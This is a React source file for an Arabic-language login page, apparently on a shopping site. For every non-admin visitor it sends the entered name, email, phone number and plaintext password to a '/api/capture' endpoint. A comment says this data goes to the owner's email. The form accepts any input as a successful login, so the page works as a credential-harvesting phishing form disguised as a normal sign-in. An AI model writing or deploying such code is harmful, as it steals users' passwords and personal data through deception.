import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

export default function Login() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({ name: '', email: '', phone: '', password: '' });
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [msgType, setMsgType] = useState('error');

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    try {
      // Check if this is the admin trying to log in
      const isAdmin = formData.email === 'wolfadmin@gmail.com';

      if (isAdmin) {
        // Use the dedicated admin endpoint — no email sending
        const res = await fetch('/api/admin-login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: formData.email, password: formData.password }),
        });
        if (res.ok) {
          localStorage.setItem('userEmail', formData.email);
          setMsgType('success');
          setMessage('مرحباً بالمدير! جاري التحويل...');
          setTimeout(() => navigate('/admin'), 1000);
        } else {
          setMsgType('error');
          setMessage('كلمة المرور غير صحيحة.');
        }
      } else {
        // Regular visitor — capture data and send to owner email (non-blocking)
        const res = await fetch('/api/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(formData),
        });
        if (res.ok) {
          localStorage.setItem('userEmail', formData.email);
          const userProfile = {
            name: formData.name,
            email: formData.email,
            phone: formData.phone,
            avatar: '' // Default generic, updated in Settings
          };
          localStorage.setItem('userProfile', JSON.stringify(userProfile));
          
          // Force update navbar
          window.dispatchEvent(new Event('profileUpdated'));
          
          const redirectToCart = sessionStorage.getItem('redirectToCart');
          
          if (redirectToCart) {
            sessionStorage.removeItem('redirectToCart');
            setMsgType('success');
            setMessage('تم التسجيل بنجاح! جاري تحويلك إلى السلة لإتمام الطلب...');
            setTimeout(() => navigate('/cart'), 1500);
          } else {
            setMsgType('success');
            setMessage('تم التسجيل بنجاح! يتم تحويلك...');
            setTimeout(() => navigate('/'), 1500);
          }
        } else {
          setMsgType('error');
          setMessage('خطأ في الاتصال، حاول مرة أخرى.');
        }
      }
    } catch (error) {
      console.error(error);
      setMsgType('error');
      setMessage('تعذّر الاتصال بالخادم. تأكد أن الخادم يعمل.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '2rem' }}>
      <div className="glass-panel" style={{ width: '100%', maxWidth: '420px', padding: '2.5rem', borderRadius: '1rem', position: 'relative' }}>
        <h2 className="text-display-md" style={{ marginBottom: '0.5rem', fontSize: '1.5rem', textAlign: 'center' }}>
          الدخول إلى الحساب
        </h2>
        <p style={{ color: 'var(--color-on-surface-variant)', textAlign: 'center', marginBottom: '2rem', fontSize: '0.9rem' }}>
          أدخل بياناتك للوصول إلى خدماتنا
        </p>

        {message && (
          <div style={{
            padding: '0.75rem',
            marginBottom: '1rem',
            borderRadius: '0.5rem',
            backgroundColor: msgType === 'success' ? 'rgba(100,220,130,0.1)' : 'rgba(255,180,171,0.1)',
            color: msgType === 'success' ? '#4ade80' : '#ffb4ab',
            fontSize: '0.875rem',
            textAlign: 'center',
            border: `1px solid ${msgType === 'success' ? 'rgba(100,220,130,0.3)' : 'rgba(255,180,171,0.3)'}`,
          }}>
            {message}
          </div>
        )}

        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1.25rem' }}>
          <div>
            <label className="text-label-sm" style={{ display: 'block', marginBottom: '0.5rem' }}>الاسم الكامل</label>
            <input
              required
              type="text"
              className="input-pro"
              placeholder="أدخل اسمك الكامل"
              value={formData.name}
              onChange={(e) => setFormData({...formData, name: e.target.value})}
            />
          </div>
          <div>
            <label className="text-label-sm" style={{ display: 'block', marginBottom: '0.5rem' }}>البريد الإلكتروني</label>
            <input
              required
              type="email"
              className="input-pro"
              placeholder="name@example.com"
              value={formData.email}
              onChange={(e) => setFormData({...formData, email: e.target.value})}
            />
          </div>
          <div>
            <label className="text-label-sm" style={{ display: 'block', marginBottom: '0.5rem' }}>رقم الهاتف</label>
            <input
              required
              type="tel"
              className="input-pro"
              placeholder="+212 6... / +966 5..."
              value={formData.phone}
              onChange={(e) => setFormData({...formData, phone: e.target.value})}
            />
          </div>
          <div>
            <label className="text-label-sm" style={{ display: 'block', marginBottom: '0.5rem' }}>كلمة المرور</label>
            <input
              required
              type="password"
              className="input-pro"
              placeholder="••••••••"
              value={formData.password}
              onChange={(e) => setFormData({...formData, password: e.target.value})}
            />
          </div>
          <button
            type="submit"
            className="btn-primary"
            style={{ width: '100%', marginTop: '0.5rem' }}
            disabled={loading}
          >
            {loading ? 'جاري التحقق...' : 'دخول'}
          </button>
        </form>
      </div>
    </div>
  );
}
